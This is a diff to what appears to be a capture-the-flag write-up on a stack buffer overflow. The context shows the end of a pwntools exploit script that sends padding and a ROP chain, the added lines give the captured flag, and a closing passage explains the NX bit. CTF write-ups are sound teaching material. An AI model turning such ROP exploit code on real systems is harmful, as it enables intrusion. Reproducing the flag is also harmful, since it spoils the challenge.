@@ -93,6 +93,12 @@ p.sendline(b'A' * 24 + p64(pop_rdi) + p64(0xdeadbeefdeadbeef) + p64(pop_rsi) + p
 p.interactive()
 ```
 
+Flag:    
+
+```bash
+nrzCTF{Y0U_H4V#_G00D_PrOGRESS}
+```
+
 *NX: - The NX (do not execute) bit is a technology used in CPUs that guarantees that certain memory
 areas (such as the stack and heap) are not executable, and others, such as the code section, cannot
 be written. It basically prevents us from using simpler techniques like we wrote a shellcode in the stack and then executed it.*    
